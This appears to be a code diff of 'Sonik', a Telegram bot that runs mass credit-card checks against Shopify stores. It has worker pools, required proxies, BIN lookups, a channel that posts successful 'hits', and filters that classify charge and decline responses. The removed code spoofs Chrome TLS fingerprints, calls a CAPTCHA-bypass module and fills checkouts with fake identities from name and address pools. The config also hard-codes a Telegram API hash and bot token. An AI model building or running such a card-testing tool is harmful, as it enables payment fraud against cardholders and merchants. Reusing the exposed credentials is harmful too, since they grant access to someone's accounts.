@@ -1,1882 +1,5173 @@
+# SONIK MAIN BOT - COMPLETE VERSION WITH ALL FIXES
+
+# Added: Accepted responses filter (only specific responses accepted)
+
+# Added: Rejected responses filter (dead sites)
+
+# Added: Increased timeout for slow sites (30s)
+
+# Added: High load support with reduced workers
+
+# Added: Proxy required for /sp and /msp
+
+# Added: Interactive buttons with emojis
+
+# Fixed: detect_payment_gateway now accepts only specific responses
+
+# Fixed: /redeem timezone issue
+
+# Enhanced: Connection limits for better performance
+
+# Fixed: Inline menu buttons (menu_checker, menu_sites, menu_proxy, menu_account, menu_admin, back_to_start)
+
+# Fixed: Menu text formatting with proper emojis and alignment
+
+# Fixed: Removed broken <code> tags from menu text
+
+# Fixed: Added Stripe Card Payments and Checkout.com - Onsite Payments to rejected gateways
+
+
+
+from telethon.errors import FloodWaitError
+
+from telethon import TelegramClient, events, Button
+
+from telethon.tl.types import MessageEntityCustomEmoji, ChannelParticipantBanned
+
+from telethon.tl.functions.channels import GetParticipantRequest
+
+from telethon.extensions import html as thtml
+
 import asyncio
+
+import aiohttp
+
+import aiofiles
+
+import os
+
 import random
-import time as _time
-import httpx
-import re
+
+import time
+
 import json
-from datetime import datetime
-from urllib.parse import urlparse, quote
-import sys
+
+import re
+
+import logging
+
+import string
+
+from datetime import datetime, timezone, timedelta
+
+from urllib.parse import quote
+
+from telethon.errors import UserNotParticipantError
+
 
 
 try:
-    sys.stdout.reconfigure(encoding='utf-8')
-except AttributeError:
-    pass
 
-# ── Selenium CAPTCHA solver (auto-bypass Shopify checkpoint) ──────────
-_CAPTCHA_SOLVER_AVAILABLE = False
-try:
-    from captcha_solver import solve_shopify_captcha, is_solver_available, get_solver_status, get_cached_cookies
-    _CAPTCHA_SOLVER_AVAILABLE = True
-    print("[shopifyapi] \u2705 Selenium CAPTCHA solver loaded")
+    import psutil
+
+    PSUTIL_AVAILABLE = True
+
 except ImportError:
-    print("[shopifyapi] \u26a0\ufe0f captcha_solver not available \u2014 CAPTCHA bypass disabled")
 
-# ── curl_cffi: Chrome TLS fingerprint impersonation ──────────────────────
-_CURL_CFFI_AVAILABLE = False
-try:
-    from curl_cffi.requests import AsyncSession as _CurlAsyncSession
-    _CURL_CFFI_AVAILABLE = True
-    print("[shopifyapi] ✅ curl_cffi loaded — Chrome TLS fingerprint active")
-except ImportError:
-    print("[shopifyapi] ⚠️ curl_cffi not installed — using httpx (CAPTCHA risk higher)")
-
-_CHROME_TO_IMPERSONATE = {"136": "chrome136", "133": "chrome133a", "131": "chrome131", "124": "chrome124", "123": "chrome123", "120": "chrome120"}
-_CURL_IMPERSONATE = list(_CHROME_TO_IMPERSONATE.values())
-
-_H2_AVAILABLE = False
-try:
-    import h2
-    _H2_AVAILABLE = True
-except ImportError:
-    pass
+    PSUTIL_AVAILABLE = False
 
 
-class _CurlSessionWrapper:
-    def __init__(self, session):
-        self._s = session
 
-    @staticmethod
-    def _clean_headers(headers):
-        if not headers:
-            return headers
-        cleaned = {}
-        for k, v in headers.items():
-            if isinstance(v, str):
-                cleaned[k] = v.encode('ascii', errors='ignore').decode('ascii')
-            else:
-                cleaned[k] = v
-        return cleaned
+from database import (
 
-    async def get(self, url, **kwargs):
-        if 'headers' in kwargs:
-            kwargs['headers'] = self._clean_headers(kwargs['headers'])
-        return await _retry_async_request(self._s.get, url, **kwargs)
+    init_db, db,
 
-    async def post(self, url, **kwargs):
-        if 'headers' in kwargs:
-            kwargs['headers'] = self._clean_headers(kwargs['headers'])
-        return await _retry_async_request(self._s.post, url, **kwargs)
+    ensure_user, get_user_subscription, set_user_subscription, is_user_subscribed,
 
-    async def __aenter__(self):
-        return self
+    is_banned_user, ban_user, unban_user, get_all_users, update_last_seen,
 
-    async def __aexit__(self, *args):
-        await self._s.close()
+    add_proxy_db, get_all_user_proxies, get_proxy_count, get_random_proxy,
 
+    remove_proxy_by_index, remove_proxy_by_url, clear_all_proxies,
 
-async def _retry_async_request(func, *args, retries=3, delay=1.0, backoff_factor=2, **kwargs):
-    for i in range(retries):
-        try:
-            return await func(*args, **kwargs)
-        except _NETWORK_ERRORS as e:
-            if i < retries - 1:
-                print(f"   ⚠️ Request failed ({e}), retrying in {delay:.2f}s...")
-                await asyncio.sleep(delay)
-                delay *= backoff_factor
-            else:
-                raise
+    save_card_to_db, get_total_cards_count, get_charged_count, get_approved_count,
 
-def _create_async_client(proxy_url=None, timeout=30.0, chrome_version=None):
-    if _CURL_CFFI_AVAILABLE:
-        if chrome_version and chrome_version in _CHROME_TO_IMPERSONATE:
-            impersonate = _CHROME_TO_IMPERSONATE[chrome_version]
-        else:
-            impersonate = random.choice(_CURL_IMPERSONATE)
-        kw = {
-            "impersonate": impersonate,
-            "allow_redirects": True,
-            "timeout": timeout,
-            "verify": False,
-        }
-        if proxy_url:
-            kw["proxy"] = proxy_url
-        session = _CurlAsyncSession(**kw)
-        return _CurlSessionWrapper(session)
-    else:
-        client_kw = {
-            "follow_redirects": True,
-            "timeout": httpx.Timeout(timeout, connect=10.0, read=30.0, write=10.0, pool=10.0), # Increased timeouts for better resilience under load
-            "limits": httpx.Limits(max_connections=200, max_keepalive_connections=50), # Increased connection limits for higher concurrency
-            "http2": _H2_AVAILABLE,
-        }
-        if proxy_url:
-            client_kw["proxy"] = proxy_url
-        return httpx.AsyncClient(**client_kw)
+    get_total_users, get_premium_count, cleanup_expired_subscriptions,
 
-_NETWORK_ERRORS = (
-    httpx.RemoteProtocolError, httpx.ConnectError, httpx.ReadTimeout,
-    httpx.ProxyError, httpx.ConnectTimeout, httpx.WriteTimeout,
-    httpx.TimeoutException,
-    ConnectionResetError, ConnectionAbortedError, OSError,
+    get_global_sites, add_global_site, add_global_sites_batch, remove_global_site, clear_all_global_sites, get_total_sites_count
+
 )
-if _CURL_CFFI_AVAILABLE:
-    try:
-        from curl_cffi.requests.errors import RequestsError as _CurlRequestsError
-        _NETWORK_ERRORS = _NETWORK_ERRORS + (_CurlRequestsError,)
-    except ImportError:
-        pass
 
-def format_proxy(proxy_string):
-    if not proxy_string or not proxy_string.strip():
-        return None
-    s = proxy_string.strip()
-    if s.startswith(("http://", "https://", "socks4://", "socks5://")):
-        return s
-    if "@" in s:
-        auth, host_port = s.split("@", 1)
-        return f"http://{auth}@{host_port}"
-    if ":" in s:
-        parts = s.split(":")
-        if len(parts) >= 4:
-            host, port, user, pwd = parts[0], parts[1], ":".join(parts[2:-1]), parts[-1]
-            if port.isdigit():
-                return f"http://{quote(user, safe='')}:{quote(pwd, safe='')}@{host}:{port}"
-        if len(parts) == 2 and parts[1].isdigit():
-            return f"http://{parts[0]}:{parts[1]}"
-    return None
 
-def load_proxy_list(source):
-    if not source or not source.strip():
-        return []
-    s = source.strip()
-    if s.lower().startswith("file:"):
-        path = s[5:].strip()
-        try:
-            with open(path, "r", encoding="utf-8", errors="ignore") as f:
-                lines = [line.strip() for line in f if line.strip()]
-            return [p for line in lines for p in [format_proxy(line)] if p]
-        except Exception as e:
-            print(f"   ⚠️ Could not load proxy file: {e}")
-            return []
-    return [p for part in s.split(",") for p in [format_proxy(part.strip())] if p]
 
-def get_random_fingerprint():
-    return _build_fingerprint_from_pools()
+# ====================== CONFIG ======================
 
-_FP_CHROME_BUILDS = {
-    "136": "136.0.7103.93",
-    "133": "133.0.6943.126",
-    "131": "131.0.6778.85",
-    "124": "124.0.6367.118",
-    "123": "123.0.6312.86",
-    "120": "120.0.6099.109",
+API_ID = 38208016
+
+API_HASH = '0d52125034b6a0d0dac3e71b40cea032'
+
+BOT_TOKEN = '8658304242:AAFvrAqvQwKxn3kykjjP8iXSP-cpeYffTCY'
+
+ADMIN_ID = [1093032296, 7077116674]
+
+HIT_CHANNEL_ID = -1002635018188
+
+JOIN_GROUP_ID = -1002635018188
+
+JOIN_CHANNEL_ID = -1002635018188
+
+JOIN_GROUP_LINK = "https://t.me/ReGict7"
+
+JOIN_CHANNEL_LINK = "https://t.me/ReGict7"
+
+API_BASE_URL = "https://shopan-production.up.railway.app/shopify"
+
+
+
+# Payment bot username
+
+PAYMENT_BOT_USERNAME = "Stars838bot"
+
+
+
+# Worker Configuration - Reduced for API stability
+
+SP_PER_USER_WORKERS = 50
+
+MSP_PER_USER_WORKERS = 60
+
+SITE_PER_USER_WORKERS = 50
+
+PROXY_PER_USER_WORKERS = 80
+
+BIN_WORKERS = 30
+
+
+
+# Timeout Configuration - Increased for slow sites
+
+API_TIMEOUT = 120
+
+BIN_TIMEOUT = 60
+
+PROXY_TIMEOUT = 8
+
+PROXY_CHECK_BATCH = 50
+
+
+
+# General Settings
+
+HIT_DELAY = 1.5
+
+MAX_CARDS_MASS = 5000
+
+
+
+# Code System Settings
+
+CODE_EXPIRY_HOURS = 24
+
+
+
+# Client
+
+client = TelegramClient('sonik_main', API_ID, API_HASH)
+
+client_instance = client
+
+
+
+_USER_SEMS = {}
+
+_BIN_SEM = asyncio.Semaphore(BIN_WORKERS)
+
+
+
+# BIN Cache
+
+_BIN_CACHE = {}
+
+_BIN_CACHE_TIME = {}
+
+_BIN_CACHE_TTL = 3600
+
+
+
+# Gateway settings - REJECT Authorize.Net, Checkout.com, AND Stripe Card Payments
+
+REJECTED_GATEWAYS = [
+    'authorize.net', 
+    'authorize', 
+    'checkout.com', 
+    'checkout', 
+    'Checkout.com - Onsite Payments',
+    'stripe', 
+    'stripe card payments',
+    'Stripe Card Payments',
+    'braintree',
+    'square',
+    'adyen',
+    'payoneer'
+]
+
+
+# ====================== ACCEPTED RESPONSES ======================
+
+# Only these responses will be accepted in /add and /site
+
+ACCEPTED_RESPONSES = [
+
+    '3ds_required',
+
+    'insufficient_funds',
+
+    'card_declined',
+
+    'order_paid',
+
+    'charged',
+
+    'payment successful'
+
+]
+
+
+
+# ====================== REJECTED RESPONSES ======================
+
+# These responses indicate dead sites - will be rejected in /add and /site
+
+REJECTED_RESPONSES = [
+
+    'empty submit response',
+
+    'empty submit',
+
+    'no valid payment method',
+
+    'no valid payment method found',
+
+    'unable to get payment token',
+
+    'cart failed with status 429',
+
+    'cart failed with status 503',
+
+    'checkout token not found',
+
+    'checkout token is empty'
+
+]
+
+
+
+PRICE_RANGES = {
+    "1": {"name": "0.01-5 USD", "min": 0.01, "max": 5},
+    "2": {"name": "0.01-10 USD", "min": 0.01, "max": 10},
+    "3": {"name": "0.01-20 USD", "min": 0.01, "max": 20},
+    "4": {"name": "0.01-40 USD", "min": 0.01, "max": 40},
+    "5": {"name": "5-10 USD", "min": 5, "max": 10},
+    "6": {"name": "5-20 USD", "min": 5, "max": 20},
+    "7": {"name": "10-20 USD", "min": 10, "max": 20},
+    "8": {"name": "20-40 USD", "min": 20, "max": 40},
 }
-_FP_CHROME_VERSIONS = tuple(_FP_CHROME_BUILDS.keys())
-_FP_CHROME_WIN = [
-    f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{build} Safari/537.36"
-    for build in _FP_CHROME_BUILDS.values()
-]
-_FP_CHROME_MAC = [
-    f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{build} Safari/537.36"
-    for build in _FP_CHROME_BUILDS.values()
-]
-_FP_CHROME_ANDROID = [
-    f"Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{build} Mobile Safari/537.36"
-    for build in _FP_CHROME_BUILDS.values()
-]
-_FP_ALL_UAS = _FP_CHROME_WIN + _FP_CHROME_MAC + _FP_CHROME_ANDROID
 
-_FP_ACCEPT_LANGS = [
-    "en-US,en;q=0.9", "en-US,en;q=0.9,es;q=0.8", "en-US,en;q=0.9,fr;q=0.8",
-    "en-US,en;q=0.9,de;q=0.8", "en-US,en;q=0.9,pt;q=0.7", "en-GB,en;q=0.9",
-    "en-GB,en;q=0.9,fr;q=0.8", "en-CA,en;q=0.9,fr;q=0.8", "en-AU,en;q=0.9",
-]
 
-_FP_CHROME_BRANDS_MAP = {
-    "136": (
-        '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
-        '"Chromium";v="136.0.7103.93", "Google Chrome";v="136.0.7103.93", "Not.A/Brand";v="99.0.0.0"',
-    ),
-    "133": (
-        '"Not?A_Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
-        '"Not?A_Brand";v="99.0.0.0", "Google Chrome";v="133.0.6943.126", "Chromium";v="133.0.6943.126"',
-    ),
-    "131": (
-        '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
-        '"Google Chrome";v="131.0.6778.85", "Chromium";v="131.0.6778.85", "Not_A Brand";v="24.0.0.0"',
-    ),
-    "124": (
-        '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
-        '"Chromium";v="124.0.6367.118", "Google Chrome";v="124.0.6367.118", "Not-A.Brand";v="99.0.0.0"',
-    ),
-    "123": (
-        '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
-        '"Google Chrome";v="123.0.6312.86", "Not:A-Brand";v="8.0.0.0", "Chromium";v="123.0.6312.86"',
-    ),
-    "120": (
-        '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-        '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.109", "Google Chrome";v="120.0.6099.109"',
-    ),
+def get_user_sem(uid, sem_type="msp"):
+
+    key = f"{uid}_{sem_type}"
+
+    if key not in _USER_SEMS:
+
+        limits = {
+
+            "sp": SP_PER_USER_WORKERS,
+
+            "msp": MSP_PER_USER_WORKERS,
+
+            "site": SITE_PER_USER_WORKERS,
+
+            "proxy": PROXY_PER_USER_WORKERS,
+
+        }
+
+        _USER_SEMS[key] = asyncio.Semaphore(limits.get(sem_type, 30))
+
+    return _USER_SEMS[key]
+
+
+
+def cleanup_user_sem(uid):
+
+    keys_to_remove = [k for k in _USER_SEMS if k.startswith(f"{uid}_")]
+
+    for k in keys_to_remove:
+
+        del _USER_SEMS[k]
+
+
+
+# ====================== EMOJIS ======================
+CE = {
+    "crown": 5039727497143387500, "bolt": 5042334757040423886,
+    "brain": 5040030395416969985, "shield": 5042328396193864923,
+    "star": 5042176294222037888, "gem": 5042050649248760772,
+    "check": 5039793437776282663, "fire": 5039644681583985437,
+    "party": 5039778134807806727, "search": 5039649904264217620,
+    "chart": 5042290883949495533, "pin": 5039600026809009149,
+    "joker": 5039998939076494446, "plus": 5039891861246838069,
+    "cross": 5040042498634810056, "info": 5042306247047513767,
+    "gift": 5041975203853239332, "eyes": 5039623284056917259,
+    "trash": 5039614900280754969, "tick": 5039844895779455925,
+    "stop": 5039671744172917707, "warn": 5039665997506675838,
+    "link": 5042101437237036298, "globe": 5042186567783809934,
+    "restart": 5413554170668032766, "online": 5413813953685923984,
+    "declined": 4956612582816351459,
+    "fire_premium": 5039644681583985437,
+    "heart_fire": 5039968412613214223,
+    "cool": 5042202682316554526,
+    "sled": 5041857106060247653,
+    "wine": 5039778134807806727,
+    "diamond": 5042050649248760772,
+    "snowman": 5041926210087545422
 }
-_FP_PLATFORMS = [('"Windows"', "?0"), ('"macOS"', "?0"), ('"Android"', "?1")]
+PE = "⭐"
 
-_FP_VIEWPORTS = [
-    "1920x1080", "1366x768", "1536x864", "1440x900", "1280x720",
-    "2560x1440", "1600x900", "1920x1200", "1680x1050", "3840x2160",
-    "1280x800", "1280x1024", "1360x768", "2560x1600",
-]
-_FP_ACCEPTS = [
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-]
-
-_RE_CHROME_VER = re.compile(r'Chrome/(\d+)')
-
-_POOL_ADDRESSES = (
-    {"add1": "123 Main St", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04101"},
-    {"add1": "456 Oak Ave", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04102"},
-    {"add1": "789 Pine Rd", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04103"},
-    {"add1": "321 Elm St", "city": "Bangor", "state": "Maine", "state_short": "ME", "zip": "04401"},
-    {"add1": "654 Maple Dr", "city": "Lewiston", "state": "Maine", "state_short": "ME", "zip": "04240"},
-    {"add1": "1200 Market St", "city": "Wilmington", "state": "Delaware", "state_short": "DE", "zip": "19801"},
-    {"add1": "950 Penn Ave", "city": "Dover", "state": "Delaware", "state_short": "DE", "zip": "19901"},
-    {"add1": "88 Broad St", "city": "Burlington", "state": "Vermont", "state_short": "VT", "zip": "05401"},
-    {"add1": "222 State St", "city": "Montpelier", "state": "Vermont", "state_short": "VT", "zip": "05602"},
-    {"add1": "415 Congress St", "city": "Portland", "state": "Maine", "state_short": "ME", "zip": "04101"},
-    {"add1": "77 Park Ave", "city": "Nashua", "state": "New Hampshire", "state_short": "NH", "zip": "03060"},
-    {"add1": "300 Elm St", "city": "Manchester", "state": "New Hampshire", "state_short": "NH", "zip": "03101"},
-    {"add1": "55 Hope St", "city": "Providence", "state": "Rhode Island", "state_short": "RI", "zip": "02906"},
-    {"add1": "180 Angell St", "city": "Providence", "state": "Rhode Island", "state_short": "RI", "zip": "02906"},
-    {"add1": "42 College St", "city": "New Haven", "state": "Connecticut", "state_short": "CT", "zip": "06510"},
-    {"add1": "600 Trumbull St", "city": "Hartford", "state": "Connecticut", "state_short": "CT", "zip": "06103"},
-    {"add1": "101 Federal St", "city": "Boston", "state": "Massachusetts", "state_short": "MA", "zip": "02110"},
-    {"add1": "250 Northern Ave", "city": "Boston", "state": "Massachusetts", "state_short": "MA", "zip": "02210"},
-    {"add1": "33 Warwick Ave", "city": "Cranston", "state": "Rhode Island", "state_short": "RI", "zip": "02910"},
-    {"add1": "710 Main St", "city": "Stamford", "state": "Connecticut", "state_short": "CT", "zip": "06901"},
-    {"add1": "1425 Broadway", "city": "New York", "state": "New York", "state_short": "NY", "zip": "10018"},
-    {"add1": "350 5th Ave", "city": "New York", "state": "New York", "state_short": "NY", "zip": "10118"},
-    {"add1": "200 Park Ave", "city": "New York", "state": "New York", "state_short": "NY", "zip": "10166"},
-    {"add1": "1600 Vine St", "city": "Los Angeles", "state": "California", "state_short": "CA", "zip": "90028"},
-    {"add1": "8500 Beverly Blvd", "city": "Los Angeles", "state": "California", "state_short": "CA", "zip": "90048"},
-    {"add1": "233 S Wacker Dr", "city": "Chicago", "state": "Illinois", "state_short": "IL", "zip": "60606"},
-    {"add1": "875 N Michigan Ave", "city": "Chicago", "state": "Illinois", "state_short": "IL", "zip": "60611"},
-    {"add1": "1500 Market St", "city": "Philadelphia", "state": "Pennsylvania", "state_short": "PA", "zip": "19102"},
-    {"add1": "401 N Broad St", "city": "Philadelphia", "state": "Pennsylvania", "state_short": "PA", "zip": "19108"},
-    {"add1": "2000 McKinney Ave", "city": "Dallas", "state": "Texas", "state_short": "TX", "zip": "75201"},
-    {"add1": "500 Main St", "city": "Houston", "state": "Texas", "state_short": "TX", "zip": "77002"},
-    {"add1": "100 Peachtree St", "city": "Atlanta", "state": "Georgia", "state_short": "GA", "zip": "30303"},
-    {"add1": "191 Peachtree St NE", "city": "Atlanta", "state": "Georgia", "state_short": "GA", "zip": "30303"},
-    {"add1": "701 Brickell Ave", "city": "Miami", "state": "Florida", "state_short": "FL", "zip": "33131"},
-    {"add1": "200 S Orange Ave", "city": "Orlando", "state": "Florida", "state_short": "FL", "zip": "32801"},
-    {"add1": "1201 3rd Ave", "city": "Seattle", "state": "Washington", "state_short": "WA", "zip": "98101"},
-    {"add1": "400 Pine St", "city": "Seattle", "state": "Washington", "state_short": "WA", "zip": "98101"},
-    {"add1": "1000 SW Broadway", "city": "Portland", "state": "Oregon", "state_short": "OR", "zip": "97205"},
-    {"add1": "750 E Pratt St", "city": "Baltimore", "state": "Maryland", "state_short": "MD", "zip": "21202"},
-    {"add1": "1100 Wilson Blvd", "city": "Arlington", "state": "Virginia", "state_short": "VA", "zip": "22209"},
-)
-_POOL_FIRST_NAMES = (
-    "John", "Emily", "Alex", "Sarah", "Michael", "Jessica", "David", "Lisa",
-    "James", "Jennifer", "Robert", "Amanda", "Daniel", "Ashley", "Matthew",
-    "Megan", "Andrew", "Lauren", "Ryan", "Rachel", "Joshua", "Stephanie",
-    "Christopher", "Nicole", "Brandon", "Elizabeth", "Tyler", "Heather",
-    "Kevin", "Samantha", "Brian", "Kimberly", "Nathan", "Melissa",
-    "Jacob", "Hannah", "Ethan", "Olivia", "Noah", "Sophia", "Liam", "Emma",
-    "Mason", "Ava", "Logan", "Isabella", "Lucas", "Mia", "Aiden", "Charlotte",
-    "Caleb", "Amelia", "Jack", "Harper", "Owen", "Evelyn", "Luke", "Abigail",
-    "Henry", "Ella", "Sebastian", "Scarlett", "Carter", "Grace", "Wyatt", "Chloe",
-    "Dylan", "Victoria", "Gabriel", "Riley", "Julian", "Aria", "Levi", "Lily",
-    "Isaac", "Aurora", "Lincoln", "Zoey", "Jaxon", "Nora", "Asher", "Camila",
-    "Theodore", "Penelope", "Leo", "Layla", "Thomas", "Paisley", "Charles", "Savannah",
-    "Marcus", "Allison", "Patrick", "Natalie", "Peter", "Hazel", "George", "Violet",
-)
-_POOL_LAST_NAMES = (
-    "Smith", "Johnson", "Williams", "Brown", "Garcia", "Miller", "Davis",
-    "Martinez", "Anderson", "Taylor", "Thomas", "Jackson", "White",
-    "Harris", "Clark", "Lewis", "Robinson", "Walker", "Young",
-    "Allen", "King", "Wright", "Scott", "Green", "Baker",
-    "Adams", "Nelson", "Hill", "Campbell", "Mitchell", "Roberts",
-    "Carter", "Phillips", "Evans", "Turner", "Torres", "Parker",
-    "Collins", "Edwards", "Stewart", "Flores", "Morris", "Nguyen",
-    "Murphy", "Rivera", "Cook", "Rogers", "Morgan", "Peterson",
-    "Cooper", "Reed", "Bailey", "Bell", "Gomez", "Kelly",
-    "Howard", "Ward", "Cox", "Diaz", "Richardson", "Wood",
-    "Watson", "Brooks", "Bennett", "Gray", "James", "Reyes",
-    "Cruz", "Hughes", "Price", "Myers", "Long", "Foster",
-)
-_POOL_EMAIL_DOMAINS = (
-    "gmail.com", "yahoo.com", "outlook.com", "icloud.com",
-    "hotmail.com", "aol.com", "protonmail.com", "mail.com",
-    "live.com", "msn.com", "ymail.com", "me.com",
-    "comcast.net", "att.net", "verizon.net", "cox.net",
-)
-_POOL_PHONES = (
-    "2025550199", "3105551234", "4155559876", "6175550123",
-    "9718081573", "2125559999", "7735551212", "4085556789",
-    "5035559012", "6025553456", "7025557890", "8015551234",
-    "2145555678", "3035559012", "4045553456", "5125557890",
-    "6155551234", "7165555678", "8185559012", "9195553456",
-    "2675557890", "3125551234", "4155555678", "5035559012",
-)
-
-
-def _build_fingerprint_from_pools():
-    ua = random.choice(_FP_ALL_UAS)
-    _ver_m = _RE_CHROME_VER.search(ua)
-    chrome_ver = _ver_m.group(1) if _ver_m else "136"
-    brand_entry = _FP_CHROME_BRANDS_MAP.get(chrome_ver, _FP_CHROME_BRANDS_MAP["136"])
-    ch_ua, ch_ua_full = brand_entry
-
-    if "Android" in ua or "Mobile" in ua:
-        platform, mobile = '"Android"', "?1"
-    elif "Macintosh" in ua or "Mac OS" in ua:
-        platform, mobile = '"macOS"', "?0"
-    else:
-        platform, mobile = '"Windows"', "?0"
-
-    fp = {
-        "_chrome_ver": chrome_ver,
-        "User-Agent": ua,
-        "Accept-Language": random.choice(_FP_ACCEPT_LANGS),
-        "Accept": random.choice(_FP_ACCEPTS),
-        "Accept-Encoding": "gzip, deflate, br, zstd",
-        "Sec-Fetch-Dest": "document",
-        "Sec-Fetch-Mode": "navigate",
-        "Sec-Fetch-Site": "none",
-        "Sec-Fetch-User": "?1",
-        "Upgrade-Insecure-Requests": "1",
-        "Cache-Control": "max-age=0",
-        "Connection": "keep-alive",
-        "Priority": "u=0, i",
-        "viewport": random.choice(_FP_VIEWPORTS),
-        "screen-depth": random.choice(["24", "32"]),
-        "Sec-Ch-Ua": ch_ua,
-        "Sec-Ch-Ua-Mobile": mobile,
-        "Sec-Ch-Ua-Platform": platform,
+def gemj(emoji_name):
+    """Return HTML for Custom Emoji (Premium)"""
+    emoji_id = CE.get(emoji_name)
+    fallback = {
+        "fire_premium": "⚡️", "heart_fire": "❤️‍🔥", "cool": "🆒",
+        "sled": "🛷", "wine": "🥂", "diamond": "💎", "snowman": "☃️"
     }
-    if random.random() < 0.5:
-        fp["Sec-Ch-Ua-Full-Version-List"] = ch_ua_full
-    if random.random() < 0.2:
-        fp["DNT"] = "1"
-
-    return fp
-
-def find_between(s, start, end):
-    try:
-        i = s.find(start)
-        if i == -1:
-            return ""
-        i += len(start)
-        j = s.find(end, i)
-        if j == -1:
-            return ""
-        return s[i:j]
-    except Exception:
-        return ""
-
-_RE_SESSION_TOKEN = re.compile(r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"')
-_RE_DELIVERY_LINE_1 = re.compile(r'"deliveryLineStableId"\s*:\s*"([^"]+)"')
-_RE_DELIVERY_LINE_2 = re.compile(r'"deliveryGroupStableId"\s*:\s*"([^"]+)"')
-_RE_DELIVERY_LINE_3 = re.compile(r"deliveryLineStableId['\"]\s*:\s*['\"]([^'\"]+)['\"]")
-_RE_DELIVERY_LINE_4 = re.compile(r'deliveryLines&quot;:\[\{&quot;stableId&quot;:&quot;([^&]+)&quot;')
-_RE_DELIVERY_LINE_5 = re.compile(r'"deliveryLines"\s*:\s*\[\s*\{\s*"stableId"\s*:\s*"([^"]+)"')
-_RE_DELIVERY_METHOD = re.compile(r'deliveryMethodTypes&quot;:\[&quot;([^&]+)&quot;')
-_RE_DELIVERY_METHOD_2 = re.compile(r'"deliveryMethodTypes"\s*:\s*\[\s*"([^"]+)"')
-_RE_DELIVERY_STRATEGY = re.compile(r'"selectedDeliveryStrategy"\s*:\s*\{\s*"handle"\s*:\s*"([^"]+)"')
+    fb = fallback.get(emoji_name, "")
+    if emoji_id:
+        return f'<tg-emoji emoji-id="{emoji_id}">{fb}</tg-emoji>'
+    return fb
 
 
-def _extract_delivery_line_stable_id(html_text):
-    if not html_text:
-        return None
-    v = find_between(html_text, 'deliveryLineStableId&quot;:&quot;', '&quot;')
-    if v:
-        return v
-    v = find_between(html_text, 'deliveryGroupStableId&quot;:&quot;', '&quot;')
-    if v:
-        return v
-    m = _RE_DELIVERY_LINE_1.search(html_text)
-    if m:
-        return m.group(1)
-    m = _RE_DELIVERY_LINE_2.search(html_text)
-    if m:
-        return m.group(1)
-    m = _RE_DELIVERY_LINE_3.search(html_text)
-    if m:
-        return m.group(1)
-    m = _RE_DELIVERY_LINE_4.search(html_text)
-    if m:
-        return m.group(1)
-    m = _RE_DELIVERY_LINE_5.search(html_text)
-    if m:
-        return m.group(1)
-    return None
+# ====================== ACTIVE PROCESSES ======================
+
+ACTIVE_MTXT_PROCESSES = {}
+
+PENDING_ADD_SITES = {}
+
+USER_APPROVED_PREF = {}
+
+MAINTENANCE_FILE = "maintenance.json"
+
+_MAINTENANCE_CACHE = {"enabled": None, "last_check": 0}
+
+_JOIN_CACHE = {}
 
 
-def _detect_requires_shipping(html_text):
-    if not html_text:
-        return None
-    m = _RE_DELIVERY_METHOD.search(html_text)
-    if m:
-        return m.group(1) != 'NONE'
-    m = _RE_DELIVERY_METHOD_2.search(html_text)
-    if m:
-        return m.group(1) != 'NONE'
-    if 'requiresShipping&quot;:false' in html_text or '"requiresShipping":false' in html_text:
-        return False
-    if 'requiresShipping&quot;:true' in html_text or '"requiresShipping":true' in html_text:
-        return True
-    return None
+
+BOT_START_TIME = time.time()
+
+MAIN_BOT_USERNAME = None
 
 
-def _extract_delivery_strategy_handle(html_text):
-    if not html_text:
-        return None
-    v = find_between(html_text, 'selectedDeliveryStrategy&quot;:{&quot;handle&quot;:&quot;', '&quot;')
-    if v:
-        return v
-    m = _RE_DELIVERY_STRATEGY.search(html_text)
-    if m:
-        return m.group(1)
-    return None
 
-_FALLBACK_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36"
+_USER_HTTP_SESSIONS = {}
 
-_HEADER_FILTER_FULL = frozenset({"user-agent", "accept", "accept-language", "accept-encoding",
-    "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform", "sec-ch-ua-full-version-list",
-    "sec-fetch-dest", "sec-fetch-mode", "sec-fetch-site", "sec-fetch-user",
-    "upgrade-insecure-requests", "cache-control", "connection", "priority"})
-_HEADER_FILTER_SMALL = frozenset({"user-agent", "accept", "accept-language",
-    "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform"})
+_GLOBAL_BIN_SESSION = None
 
-class ShopifyAuto:
-    def __init__(self, fingerprint=None):
-        if fingerprint:
-            self.user_agent = fingerprint.get("User-Agent") or fingerprint.get("user-agent") or _FALLBACK_UA
-            self.fingerprint = fingerprint
-        else:
-            self.user_agent = _FALLBACK_UA
-            self.fingerprint = {}
-        self.last_price = None
-    
-    async def tokenize_card(self, session, cc, mon, year, cvv, first, last):
+_GLOBAL_PROXY_SESSION = None
+
+
+
+# ====================== LOGGING ======================
+
+log = logging.getLogger("Sonik")
+
+log.setLevel(logging.INFO)
+
+_log_fmt = logging.Formatter('[%(asctime)s] [%(levelname)s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
+
+_ch = logging.StreamHandler()
+
+_ch.setLevel(logging.INFO)
+
